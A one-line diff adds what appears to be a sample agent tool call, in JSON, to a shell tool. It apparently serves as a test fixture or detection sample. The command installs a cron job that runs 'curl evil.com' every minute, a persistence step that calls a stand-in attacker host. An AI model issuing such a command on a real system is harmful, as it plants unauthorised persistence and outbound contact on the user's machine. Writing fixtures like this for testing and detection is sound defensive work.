@@ -1,0 +1,1 @@
+{"name":"shell","input":{"command":"echo \"* * * * * curl evil.com\" | crontab -"}}
